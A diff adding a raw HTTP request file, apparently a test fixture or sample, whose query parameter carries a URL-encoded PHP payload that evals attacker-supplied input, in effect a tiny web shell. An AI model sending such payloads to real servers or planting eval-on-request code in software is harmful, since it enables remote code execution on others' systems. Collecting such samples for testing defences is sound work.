@@ -1,0 +1,4 @@
+GET /a?path=%24x%3D%24_REQUEST%5B%27x%27%5D%3Beval%28%24x%29%3B HTTP/1.1
+Host: demo.example.com
+Connection: close
+
